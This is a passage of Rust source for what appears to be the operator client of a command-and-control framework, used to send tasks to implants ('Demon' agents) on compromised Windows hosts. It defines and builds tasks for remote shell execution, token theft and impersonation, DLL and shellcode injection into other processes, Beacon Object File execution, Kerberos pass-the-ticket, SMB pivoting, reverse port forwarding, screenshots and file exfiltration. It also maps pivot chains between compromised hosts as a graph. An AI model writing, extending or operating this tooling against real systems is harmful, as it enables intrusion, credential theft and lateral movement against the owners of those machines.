        usage: "help [command]",
        cmd_type: "Command",
        description: "Show available commands or help for a specific command",
    },
    ConsoleCommandSpec {
        name: "shell",
        aliases: &[],
        usage: "shell <command>",
        cmd_type: "Command",
        description: "Executes a shell command via cmd.exe",
    },
    ConsoleCommandSpec {
        name: "sleep",
        aliases: &[],
        usage: "sleep <seconds> [jitter%]",
        cmd_type: "Command",
        description: "Sets the agent sleep delay and optional jitter",
    },
    ConsoleCommandSpec {
        name: "checkin",
        aliases: &[],
        usage: "checkin",
        cmd_type: "Command",
        description: "Request the agent to check in immediately",
    },
    ConsoleCommandSpec {
        name: "kill",
        aliases: &["exit"],
        usage: "kill [process]",
        cmd_type: "Command",
        description: "Kill the agent (thread or process)",
    },
    ConsoleCommandSpec {
        name: "ps",
        aliases: &["proclist"],
        usage: "ps",
        cmd_type: "Command",
        description: "List running processes",
    },
    ConsoleCommandSpec {
        name: "screenshot",
        aliases: &[],
        usage: "screenshot",
        cmd_type: "Command",
        description: "Takes a screenshot of the current desktop",
    },
    ConsoleCommandSpec {
        name: "pwd",
        aliases: &[],
        usage: "pwd",
        cmd_type: "Command",
        description: "Print the current working directory",
    },
    ConsoleCommandSpec {
        name: "cd",
        aliases: &[],
        usage: "cd <path>",
        cmd_type: "Command",
        description: "Change the working directory",
    },
    ConsoleCommandSpec {
        name: "dir",
        aliases: &["ls"],
        usage: "dir <path>",
        cmd_type: "Command",
        description: "List files in a directory",
    },
    ConsoleCommandSpec {
        name: "mkdir",
        aliases: &[],
        usage: "mkdir <path>",
        cmd_type: "Command",
        description: "Create a directory",
    },
    ConsoleCommandSpec {
        name: "rm",
        aliases: &["del", "remove"],
        usage: "rm <path>",
        cmd_type: "Command",
        description: "Delete a file or directory",
    },
    ConsoleCommandSpec {
        name: "cp",
        aliases: &["copy"],
        usage: "cp <src> <dst>",
        cmd_type: "Command",
        description: "Copy a file to another location",
    },
    ConsoleCommandSpec {
        name: "mv",
        aliases: &["move"],
        usage: "mv <src> <dst>",
        cmd_type: "Command",
        description: "Move or rename a file",
    },
    ConsoleCommandSpec {
        name: "cat",
        aliases: &["type"],
        usage: "cat <path>",
        cmd_type: "Command",
        description: "Read and display a file's contents",
    },
    ConsoleCommandSpec {
        name: "download",
        aliases: &[],
        usage: "download <path>",
        cmd_type: "Command",
        description: "Download a file from the target",
    },
    ConsoleCommandSpec {
        name: "upload",
        aliases: &[],
        usage: "upload <local> <remote>",
        cmd_type: "Command",
        description: "Upload a local file to the target",
    },
    ConsoleCommandSpec {
        name: "proc",
        aliases: &[],
        usage: "proc <kill|modules|grep|create|memory> [args]",
        cmd_type: "Command",
        description: "Process management and inspection",
    },
    ConsoleCommandSpec {
        name: "token",
        aliases: &[],
        usage: "token <list|steal|make|impersonate|revert|privs|uid|clear> [args]",
        cmd_type: "Command",
        description: "Token impersonation and management",
    },
    ConsoleCommandSpec {
        name: "inline-execute",
        aliases: &["bof"],
        usage: "inline-execute <bof-path> [args]",
        cmd_type: "Command",
        description: "Execute a Beacon Object File (COFF) in-process",
    },
    ConsoleCommandSpec {
        name: "inject-dll",
        aliases: &[],
        usage: "inject-dll <pid> <dll-path>",
        cmd_type: "Module",
        description: "Inject a DLL into a remote process",
    },
    ConsoleCommandSpec {
        name: "inject-shellcode",
        aliases: &[],
        usage: "inject-shellcode <pid> <bin-path>",
        cmd_type: "Module",
        description: "Inject shellcode into a remote process",
    },
    ConsoleCommandSpec {
        name: "spawn-dll",
        aliases: &[],
        usage: "spawn-dll <dll-path> [args]",
        cmd_type: "Module",
        description: "Spawn a sacrificial process and inject a DLL",
    },
    ConsoleCommandSpec {
        name: "net",
        aliases: &[],
        usage: "net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]",
        cmd_type: "Command",
        description: "Network and Active Directory enumeration",
    },
    ConsoleCommandSpec {
        name: "pivot",
        aliases: &[],
        usage: "pivot <list|connect|disconnect> [args]",
        cmd_type: "Command",
        description: "SMB pivot link management",
    },
    ConsoleCommandSpec {
        name: "rportfwd",
        aliases: &[],
        usage: "rportfwd <add|remove|list|clear> [args]",
        cmd_type: "Command",
        description: "Reverse port forwarding through the agent",
    },
    ConsoleCommandSpec {
        name: "kerberos",
        aliases: &[],
        usage: "kerberos <luid|klist|purge|ptt> [args]",
        cmd_type: "Command",
        description: "Kerberos ticket management",
    },
    ConsoleCommandSpec {
        name: "config",
        aliases: &[],
        usage: "config <sleep-obf|implant.verbose|inject.spoofaddr|killdate|workinghours> [args]",
        cmd_type: "Command",
        description: "Modify agent runtime configuration",
    },
];

fn build_file_browser_list_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("ls {path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("dir".to_owned()),
            arguments: Some(format!("{path};true;false;false;false;;;")),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_file_browser_pwd_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(operator, filesystem_task(agent_id, "pwd", "pwd", None))
}

fn build_file_browser_cd_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("cd {path}"), "cd", Some(path.to_owned())),
    )
}

fn build_file_browser_download_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_transfer_task(agent_id, &format!("download {path}"), "download", path),
    )
}

fn build_file_browser_delete_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("rm {path}"), "remove", Some(path.to_owned())),
    )
}

fn build_file_browser_upload_task(
    agent_id: &str,
    remote_path: &str,
    content: &[u8],
    operator: &str,
) -> OperatorMessage {
    let remote = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
    let content = base64::engine::general_purpose::STANDARD.encode(content);
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("upload {remote_path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("upload".to_owned()),
            arguments: Some(format!("{remote};{content}")),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_console_task(
    agent_id: &str,
    input: &str,
    operator: &str,
) -> Result<OperatorMessage, String> {
    let trimmed = input.trim();
    let mut parts = trimmed.split_whitespace();
    let Some(command) = parts.next() else {
        return Err("Command input is empty.".to_owned());
    };
    let command = command.to_ascii_lowercase();

    let info = match command.as_str() {
        // Local-only commands are handled before this function is called.
        "help" | "?" => {
            return Err("Use the help command for usage information.".to_owned());
        }
        "shell" => {
            let shell_cmd = rest_after_word(trimmed)?;
            simple_task(
                agent_id,
                trimmed,
                DemonCommand::CommandInlineExecute,
                "shell",
                Some(shell_cmd),
            )
        }
        "sleep" => sleep_task(agent_id, trimmed)?,
        "checkin" => simple_task(agent_id, trimmed, DemonCommand::CommandCheckin, "checkin", None),
        "kill" | "exit" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("kill".to_owned()),
            arguments: parts.next().map(ToOwned::to_owned),
            ..AgentTaskInfo::default()
        },
        "ps" | "proclist" => {
            simple_task(agent_id, trimmed, DemonCommand::CommandProcList, "ps", None)
        }
        "screenshot" => {
            simple_task(agent_id, trimmed, DemonCommand::CommandScreenshot, "screenshot", None)
        }
        "pwd" => filesystem_task(agent_id, trimmed, "pwd", None),
        "cd" => filesystem_task(agent_id, trimmed, "cd", Some(rest_after_word(trimmed)?)),
        "dir" | "ls" => {
            let path = rest_after_word(trimmed)?;
            filesystem_task(
                agent_id,
                trimmed,
                "dir",
                Some(format!("{path};true;false;false;false;;;")),
            )
        }
        "mkdir" => filesystem_task(agent_id, trimmed, "mkdir", Some(rest_after_word(trimmed)?)),
        "rm" | "del" | "remove" => {
            filesystem_task(agent_id, trimmed, "remove", Some(rest_after_word(trimmed)?))
        }
        "cp" | "copy" => filesystem_copy_or_move_task(agent_id, trimmed, "cp")?,
        "mv" | "move" => filesystem_copy_or_move_task(agent_id, trimmed, "move")?,
        "download" => {
            filesystem_transfer_task(agent_id, trimmed, "download", &rest_after_word(trimmed)?)
        }
        "upload" => upload_console_task(agent_id, trimmed)?,
        "cat" | "type" => {
            filesystem_transfer_task(agent_id, trimmed, "cat", &rest_after_word(trimmed)?)
        }
        "proc" => process_task(agent_id, trimmed)?,
        "token" => token_task(agent_id, trimmed)?,
        "inline-execute" | "bof" => inline_execute_task(agent_id, trimmed)?,
        "inject-dll" => inject_dll_console_task(agent_id, trimmed)?,
        "inject-shellcode" => inject_shellcode_console_task(agent_id, trimmed)?,
        "spawn-dll" => spawn_dll_console_task(agent_id, trimmed)?,
        "net" => net_task(agent_id, trimmed)?,
        "pivot" => pivot_task(agent_id, trimmed)?,
        "rportfwd" => rportfwd_task(agent_id, trimmed)?,
        "kerberos" => kerberos_task(agent_id, trimmed)?,
        "config" => config_task(agent_id, trimmed)?,
        _ => {
            let usage =
                closest_command_usage(&command).unwrap_or("Type `help` for available commands.");
            return Err(format!("Unsupported console command `{command}`. {usage}"));
        }
    };

    Ok(build_agent_task(operator, info))
}

fn filesystem_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    arguments: Option<String>,
) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments,
        ..AgentTaskInfo::default()
    }
}

fn filesystem_transfer_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    path: &str,
) -> AgentTaskInfo {
    let encoded = Some(base64::engine::general_purpose::STANDARD.encode(path.as_bytes()));
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments: encoded,
        ..AgentTaskInfo::default()
    }
}

fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub_command = parts
        .next()
        .ok_or_else(|| "Usage: proc <kill|modules|grep|create|memory> [args]".to_owned())?;
    let sub_lower = sub_command.to_ascii_lowercase();
    match sub_lower.as_str() {
        "kill" => {
            let pid = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
            if parts.next().is_some() {
                return Err("Usage: proc kill <pid>".to_owned());
            }
            let pid = pid.parse::<u32>().map_err(|_| format!("Invalid PID `{pid}`."))?;
            Ok(process_kill_info(agent_id, pid))
        }
        "modules" | "grep" | "create" | "memory" => {
            let args: String = parts.collect::<Vec<_>>().join(" ");
            Ok(AgentTaskInfo {
                demon_id: agent_id.to_owned(),
                task_id: format!("{:08X}", next_task_id()),
                command_id: u32::from(DemonCommand::CommandProc).to_string(),
                command_line: command_line.to_owned(),
                command: Some("proc".to_owned()),
                sub_command: Some(sub_lower),
                arguments: if args.is_empty() { None } else { Some(args) },
                ..AgentTaskInfo::default()
            })
        }
        _ => Err("Usage: proc <kill|modules|grep|create|memory> [args]".to_owned()),
    }
}

fn process_kill_info(agent_id: &str, pid: u32) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandProc).to_string(),
        command_line: format!("proc kill {pid}"),
        command: Some("proc".to_owned()),
        sub_command: Some("kill".to_owned()),
        arguments: Some(pid.to_string()),
        extra: BTreeMap::from([("Args".to_owned(), serde_json::Value::String(pid.to_string()))]),
        ..AgentTaskInfo::default()
    }
}

/// Builds a task with a single command ID and optional arguments string.
fn simple_task(
    agent_id: &str,
    command_line: &str,
    demon_cmd: DemonCommand,
    command_name: &str,
    arguments: Option<String>,
) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(demon_cmd).to_string(),
        command_line: command_line.to_owned(),
        command: Some(command_name.to_owned()),
        arguments,
        ..AgentTaskInfo::default()
    }
}

fn sleep_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "sleep"
    let delay = parts.next().ok_or_else(|| "Usage: sleep <seconds> [jitter%]".to_owned())?;
    let jitter = parts.next().unwrap_or("0");
    let delay_val: u32 = delay.parse().map_err(|_| format!("Invalid delay `{delay}`."))?;
    let jitter_val: u32 =
        jitter.trim_end_matches('%').parse().map_err(|_| format!("Invalid jitter `{jitter}`."))?;
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSleep).to_string(),
        command_line: command_line.to_owned(),
        command: Some("sleep".to_owned()),
        arguments: Some(format!("{delay_val};{jitter_val}")),
        ..AgentTaskInfo::default()
    })
}

fn filesystem_copy_or_move_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let src = parts.next().ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
    let dst = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
    Ok(filesystem_task(agent_id, command_line, sub_command, Some(format!("{src};{dst}"))))
}

fn upload_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let local_path = parts.next().ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
    let remote_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
    let content =
        std::fs::read(local_path).map_err(|err| format!("Failed to read `{local_path}`: {err}"))?;
    let remote_b64 = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
    let content_b64 = base64::engine::general_purpose::STANDARD.encode(&content);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some("upload".to_owned()),
        arguments: Some(format!("{remote_b64};{content_b64}")),
        ..AgentTaskInfo::default()
    })
}

fn token_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "token"
    let sub = parts.next().ok_or_else(|| {
        "Usage: token <list|steal|make|impersonate|revert|privs|uid|clear> [args]".to_owned()
    })?;
    let sub_lower = sub.to_ascii_lowercase();
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandToken).to_string(),
        command_line: command_line.to_owned(),
        command: Some("token".to_owned()),
        sub_command: Some(sub_lower),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn inline_execute_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let bof_path =
        parts.next().ok_or_else(|| "Usage: inline-execute <bof-path> [args]".to_owned())?;
    let bof_args = parts.next().unwrap_or_default().trim().to_owned();
    let binary =
        std::fs::read(bof_path).map_err(|err| format!("Failed to read `{bof_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandInlineExecute).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inline-execute".to_owned()),
        arguments: Some(if bof_args.is_empty() {
            binary_b64
        } else {
            format!("{binary_b64};{bof_args}")
        }),
        ..AgentTaskInfo::default()
    })
}

fn inject_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let pid_str = parts.next().ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
    let dll_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
    let binary =
        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inject-dll".to_owned()),
        extra: BTreeMap::from([
            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn inject_shellcode_console_task(
    agent_id: &str,
    command_line: &str,
) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let pid_str =
        parts.next().ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
    let bin_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
    let binary =
        std::fs::read(bin_path).map_err(|err| format!("Failed to read `{bin_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inject-shellcode".to_owned()),
        extra: BTreeMap::from([
            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn spawn_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let dll_path = parts.next().ok_or_else(|| "Usage: spawn-dll <dll-path> [args]".to_owned())?;
    let args = parts.next().unwrap_or_default().trim().to_owned();
    let binary =
        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    let args_b64 = if args.is_empty() {
        String::new()
    } else {
        base64::engine::general_purpose::STANDARD.encode(args.as_bytes())
    };
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSpawnDll).to_string(),
        command_line: command_line.to_owned(),
        command: Some("spawn-dll".to_owned()),
        extra: BTreeMap::from([
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
            ("Arguments".to_owned(), serde_json::Value::String(args_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn net_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "net"
    let sub = parts.next().ok_or_else(|| {
        "Usage: net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]"
            .to_owned()
    })?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandNet).to_string(),
        command_line: command_line.to_owned(),
        command: Some("net".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn pivot_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: pivot <list|connect|disconnect> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandPivot).to_string(),
        command_line: command_line.to_owned(),
        command: Some("pivot".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn rportfwd_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: rportfwd <add|remove|list|clear> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    let sub_lower = sub.to_ascii_lowercase();
    let sub_full = format!("rportfwd {sub_lower}");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSocket).to_string(),
        command_line: command_line.to_owned(),
        command: Some("socket".to_owned()),
        sub_command: Some(sub_full),
        arguments: if args.is_empty() { None } else { Some(args.replace(' ', ";")) },
        ..AgentTaskInfo::default()
    })
}

fn kerberos_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub =
        parts.next().ok_or_else(|| "Usage: kerberos <luid|klist|purge|ptt> [args]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandKerberos).to_string(),
        command_line: command_line.to_owned(),
        command: Some("kerberos".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn config_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub = parts.next().ok_or_else(|| "Usage: config <option> [value]".to_owned())?;
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandConfig).to_string(),
        command_line: command_line.to_owned(),
        command: Some("config".to_owned()),
        sub_command: Some(sub.to_ascii_lowercase()),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn rest_after_word(input: &str) -> Result<String, String> {
    let mut parts = input.trim().splitn(2, char::is_whitespace);
    let _ = parts.next();
    let rest = parts.next().map(str::trim).unwrap_or_default();
    if rest.is_empty() {
        Err("This command requires an argument.".to_owned())
    } else {
        Ok(rest.to_owned())
    }
}

fn push_history_entry(console: &mut AgentConsoleState, command_line: &str) {
    if console.history.last().is_some_and(|last| last == command_line) {
        console.history_index = None;
        console.completion_index = 0;
        console.completion_seed = None;
        return;
    }

    console.history.push(command_line.to_owned());
    console.history_index = None;
    console.completion_index = 0;
    console.completion_seed = None;
}

fn apply_history_step(console: &mut AgentConsoleState, direction: HistoryDirection) {
    if console.history.is_empty() {
        return;
    }

    let next_index = match (direction, console.history_index) {
        (HistoryDirection::Older, None) => Some(console.history.len().saturating_sub(1)),
        (HistoryDirection::Older, Some(index)) => Some(index.saturating_sub(1)),
        (HistoryDirection::Newer, Some(index)) if index + 1 < console.history.len() => {
            Some(index + 1)
        }
        (HistoryDirection::Newer, Some(_)) => None,
        (HistoryDirection::Newer, None) => None,
    };

    console.history_index = next_index;
    console.input =
        next_index.and_then(|index| console.history.get(index).cloned()).unwrap_or_default();
    console.completion_index = 0;
    console.completion_seed = None;
}

fn apply_completion(console: &mut AgentConsoleState) {
    let prefix = console.input.trim();
    if prefix.contains(char::is_whitespace) {
        return;
    }

    let seed = console
        .completion_seed
        .clone()
        .filter(|seed| !seed.is_empty())
        .unwrap_or_else(|| prefix.to_owned());
    let matches = console_completion_candidates(&seed);
    if matches.is_empty() {
        return;
    }

    if console.completion_seed.as_deref() != Some(seed.as_str()) {
        console.completion_index = 0;
    }

    let next = console.completion_index % matches.len();
    console.input = matches[next].to_owned();
    console.completion_index = next + 1;
    console.completion_seed = Some(seed);
}

fn console_completion_candidates(prefix: &str) -> Vec<&'static str> {
    let needle = prefix.trim().to_ascii_lowercase();
    if needle.is_empty() {
        return CONSOLE_COMMANDS.iter().map(|spec| spec.name).collect();
    }

    CONSOLE_COMMANDS
        .iter()
        .filter(|spec| {
            spec.name.starts_with(&needle)
                || spec.aliases.iter().any(|alias| alias.starts_with(&needle))
        })
        .map(|spec| spec.name)
        .collect()
}

fn closest_command_usage(command: &str) -> Option<&'static str> {
    CONSOLE_COMMANDS.iter().find_map(|spec| {
        (spec.name == command || spec.aliases.contains(&command)).then_some(spec.usage)
    })
}

#[allow(dead_code)]
fn split_console_selection<'a>(
    open_consoles: &'a [String],
    selected_console: Option<&'a str>,
) -> Vec<&'a str> {
    if open_consoles.is_empty() {
        return Vec::new();
    }

    let selected = selected_console.unwrap_or(open_consoles[0].as_str());
    let mut visible = vec![selected];
    for agent_id in open_consoles {
        if agent_id != selected {
            visible.push(agent_id.as_str());
        }
        if visible.len() == 2 {
            break;
        }
    }
    visible
}

fn build_session_graph(agents: &[transport::AgentSummary]) -> SessionGraphLayout {
    let mut sorted_agents = agents.to_vec();
    sorted_agents.sort_by(|left, right| left.name_id.cmp(&right.name_id));

    let known_ids =
        sorted_agents.iter().map(|agent| agent.name_id.clone()).collect::<BTreeSet<_>>();
    let mut parent_by_child = BTreeMap::new();

    for agent in &sorted_agents {
        if let Some(parent) = agent
            .pivot_parent
            .as_deref()
            .filter(|parent| known_ids.contains(*parent))
            .filter(|parent| *parent != agent.name_id)
        {
            parent_by_child.insert(agent.name_id.clone(), parent.to_owned());
        }
    }

    for agent in &sorted_agents {
        for child in &agent.pivot_links {
            if child != &agent.name_id
                && known_ids.contains(child)
                && !parent_by_child.contains_key(child)
            {
                parent_by_child.insert(child.clone(), agent.name_id.clone());
            }
        }
    }

    let mut children = BTreeMap::<String, Vec<String>>::new();
    children.entry(SESSION_GRAPH_ROOT_ID.to_owned()).or_default();
    for agent in &sorted_agents {
        let parent = parent_by_child
            .get(&agent.name_id)
            .cloned()
            .unwrap_or_else(|| SESSION_GRAPH_ROOT_ID.to_owned());
        children.entry(parent).or_default().push(agent.name_id.clone());
    }
    for child_ids in children.values_mut() {
        child_ids.sort();
    }

    let mut positions = BTreeMap::new();
    let mut next_leaf = 0.0;
    assign_session_graph_positions(
        SESSION_GRAPH_ROOT_ID,
        0,
        &children,
        &mut next_leaf,
        &mut positions,
    );

    let mut nodes = vec![SessionGraphNode {
        id: SESSION_GRAPH_ROOT_ID.to_owned(),
        title: "Teamserver".to_owned(),
        subtitle: "root".to_owned(),
        status: "Online".to_owned(),
        position: positions.get(SESSION_GRAPH_ROOT_ID).copied().unwrap_or(Pos2::ZERO),
        size: egui::vec2(148.0, 52.0),
        kind: SessionGraphNodeKind::Teamserver,
    }];

    for agent in sorted_agents {
        nodes.push(SessionGraphNode {
            title: if agent.hostname.trim().is_empty() {
                agent.name_id.clone()
            } else {
                agent.hostname.clone()
            },
            subtitle: agent.name_id.clone(),
            status: agent.status.clone(),
            position: positions.get(&agent.name_id).copied().unwrap_or(Pos2::ZERO),
            size: egui::vec2(138.0, 58.0),
            id: agent.name_id,
            kind: SessionGraphNodeKind::Agent,
        });
    }

    let mut edges = Vec::new();
    for (parent, child_ids) in children {
        for child in child_ids {
            edges.push(SessionGraphEdge { from: parent.clone(), to: child });
        }
    }

    SessionGraphLayout { nodes, edges }
}

fn assign_session_graph_positions(
    node_id: &str,
    depth: usize,
    children: &BTreeMap<String, Vec<String>>,
    next_leaf: &mut f32,
    positions: &mut BTreeMap<String, Pos2>,
) -> f32 {
    const H_SPACING: f32 = 220.0;
    const V_SPACING: f32 = 120.0;

    let child_ids = children.get(node_id).cloned().unwrap_or_default();
    let x = if child_ids.is_empty() {
        let x = *next_leaf * H_SPACING;
        *next_leaf += 1.0;
        x
    } else {
        let child_xs = child_ids
            .iter()
            .map(|child| {
                assign_session_graph_positions(child, depth + 1, children, next_leaf, positions)
            })
            .collect::<Vec<_>>();
        let first = child_xs.first().copied().unwrap_or(*next_leaf * H_SPACING);
        let last = child_xs.last().copied().unwrap_or(first);
        (first + last) * 0.5
    };

    positions.insert(node_id.to_owned(), Pos2::new(x, depth as f32 * V_SPACING));
    x
}

fn graph_node_position(layout: &SessionGraphLayout, node_id: &str) -> Option<Pos2> {
